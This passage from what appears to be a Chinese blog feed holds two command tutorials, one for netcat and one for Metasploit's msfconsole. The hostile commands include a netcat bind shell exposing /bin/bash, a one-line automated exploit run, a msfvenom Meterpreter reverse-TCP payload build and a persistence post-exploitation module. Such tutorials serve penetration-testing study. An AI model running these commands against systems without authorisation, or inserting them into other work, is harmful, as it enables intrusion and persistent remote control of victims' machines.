&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -zvu 192.168.1.1 &lt;span class="m">53&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>扫描目标主机的 UDP 端口 53。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="二监听端口">（二）监听端口
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>TCP 端口监听&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -l &lt;span class="m">8080&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在本地监听 8080 端口。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>UDP 端口监听&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -u -l &lt;span class="m">8080&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>使用 UDP 协议监听 8080 端口。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="三数据传输">（三）数据传输
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>发送文件&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc 192.168.1.2 &lt;span class="m">12345&lt;/span> &amp;lt; file.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>将 &lt;code>file.txt&lt;/code> 发送到远程主机的 12345 端口。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>接收文件&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -l &lt;span class="m">12345&lt;/span> &amp;gt; file.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在本地监听 12345 端口并接收文件。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="四远程命令执行">（四）远程命令执行
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>目标机器上&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvp &lt;span class="m">4444&lt;/span> -e /bin/bash
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在目标机器上监听 4444 端口，并将 &lt;code>/bin/bash&lt;/code> 作为远程命令执行。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>攻击者机器上&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc 192.168.1.2 &lt;span class="m">4444&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>连接到目标机器的 4444 端口，获取远程命令执行的 Shell。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="五端口转发">（五）端口转发
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>本地端口转发&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -l &lt;span class="m">8080&lt;/span> &lt;span class="p">|&lt;/span> nc 192.168.1.100 &lt;span class="m">80&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>将本地 8080 端口的数据转发到远程服务器的 80 端口。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="六网络调试">（六）网络调试
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>发送 HTTP 请求&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> -ne &lt;span class="s2">&amp;#34;GET / HTTP/1.1\r\nHost: example.com\r\n\r\n&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> nc example.com &lt;span class="m">80&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>向目标服务器发送 HTTP 请求。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="六注意事项">六、注意事项
&lt;/h2>&lt;ol>
&lt;li>&lt;strong>权限问题&lt;/strong>：某些功能（如监听低端口号）可能需要管理员权限。&lt;/li>
&lt;li>&lt;strong>安全问题&lt;/strong>：使用远程命令执行功能时需谨慎，避免安全风险。&lt;/li>
&lt;li>&lt;strong>版本差异&lt;/strong>：不同版本的 &lt;code>nc&lt;/code>（如 &lt;code>netcat&lt;/code>、&lt;code>ncat&lt;/code>）功能可能有所不同。&lt;/li>
&lt;li>&lt;strong>安装路径&lt;/strong>：安装完成后，可能需要将 &lt;code>nc&lt;/code> 的路径添加到系统的环境变量中，以便在任意终端中直接使用。&lt;/li>
&lt;/ol>
&lt;h2 id="七总结">七、总结
&lt;/h2>&lt;p>&lt;code>nc&lt;/code> 是一个功能强大的网络工具，适用于多种场景，包括端口扫描、数据传输、远程控制等。通过掌握基本语法和高级功能，可以快速实现网络通信和数据传输，帮助进行网络管理和故障排查。&lt;/p></description></item><item><title>Msfconsole命令使用</title><link>https://souljian.cn/p/745161814/</link><pubDate>Sun, 20 Apr 2025 23:10:14 +0800</pubDate><guid>https://souljian.cn/p/745161814/</guid><description>&lt;h2 id="一简介">一、简介
&lt;/h2>&lt;p>&lt;code>msfconsole&lt;/code> 是 Metasploit Framework 的命令行界面，用于执行各种安全测试和渗透测试任务。Metasploit 是一个功能强大的渗透测试工具，提供了丰富的漏洞利用模块、后渗透工具和自动化功能。&lt;/p>
&lt;h2 id="二安装">二、安装
&lt;/h2>&lt;ul>
&lt;li>
&lt;p>&lt;strong>Kali Linux&lt;/strong>（Metasploit 已预装）：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo apt update
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo apt install metasploit-framework
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>其他 Linux 发行版&lt;/strong>：
可以通过 &lt;a class="link" href="https://www.rapid7.com/products/metasploit/" target="_blank" rel="noopener"
>Rapid7 官方网站&lt;/a> 获取安装指南。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="三基本语法">三、基本语法
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfconsole
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="四常用命令">四、常用命令
&lt;/h2>&lt;h3 id="一启动-msfconsole">（一）启动 &lt;code>msfconsole&lt;/code>
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfconsole
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="二查找模块">（二）查找模块
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">search &amp;lt;keyword&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>例如：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">search apache
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="三使用模块">（三）使用模块
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">use &amp;lt;module&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>例如：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">use exploit/unix/webapp/apache_mod_cgi
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="四设置模块选项">（四）设置模块选项
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> &amp;lt;option&amp;gt; &amp;lt;value&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>例如：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> RHOSTS 192.168.1.100
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> RPORT &lt;span class="m">80&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="五查看模块选项">（五）查看模块选项
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">show options
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="六运行模块">（六）运行模块
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">run
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="七退出-msfconsole">（七）退出 &lt;code>msfconsole&lt;/code>
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">exit&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="五高级用法">五、高级用法
&lt;/h2>&lt;h3 id="一自动化攻击">（一）自动化攻击
&lt;/h3>&lt;p>使用 &lt;code>msfconsole&lt;/code> 的自动化功能可以快速执行攻击任务。例如：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfconsole -q -x &lt;span class="s2">&amp;#34;use exploit/unix/webapp/apache_mod_cgi; set RHOSTS 192.168.1.100; set RPORT 80; run&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="二生成-meterpreter-有效载荷">（二）生成 Meterpreter 有效载荷
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfvenom -p windows/meterpreter/reverse_tcp &lt;span class="nv">LHOST&lt;/span>&lt;span class="o">=&lt;/span>192.168.1.100 &lt;span class="nv">LPORT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">4444&lt;/span> -f exe -o payload.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="三使用-meterpreter-会话">（三）使用 Meterpreter 会话
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sessions -l
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sessions -i &amp;lt;session_id&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="四后渗透攻击">（四）后渗透攻击
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">search post
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">use post/windows/manage/persistence
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="五利用漏洞">（五）利用漏洞
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">search exploit
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">use exploit/unix/webapp/apache_mod_cgi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> RHOSTS 192.168.1.100
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> RPORT &lt;span class="m">80&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">run
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="六端口扫描">（六）端口扫描
&lt;/h3>&lt;ol>
&lt;li>
&lt;p>查看端口扫描模块：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">search portscan
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>使用端口扫描模块：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">use auxiliary/scanner/portscan/top
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>查看模块选项：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">show options
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>设置目标 IP：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> RHOSTS 192.168.1.100
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>设置线程数：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> THREADS &lt;span class="m">100&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>执行扫描：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">run
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ol>
&lt;h3 id="七服务扫描">（七）服务扫描
&lt;/h3>&lt;ol>
&lt;li>
&lt;p>查看服务扫描模块：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">search smb_version
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>使用服务扫描模块：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">use auxiliary/scanner/smb/smb_version
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>查看模块选项：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">show options
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>设置目标 IP：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> RHOSTS 192.168.1.100
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>设置线程数：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> THREADS &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>执行扫描：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">run
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="六注意事项">六、注意事项
&lt;/h2>&lt;ol>
&lt;li>&lt;strong>权限问题&lt;/strong>：某些功能（如监听低端口号）可能需要管理员权限。&lt;/li>
&lt;li>&lt;strong>网络环境&lt;/strong>：某些网络环境可能限制某些模块的使用。&lt;/li>
&lt;li>&lt;strong>法律问题&lt;/strong>：未经授权的渗透测试行为可能违反法律法规。&lt;/li>
&lt;/ol>
&lt;h2 id="七总结">七、总结
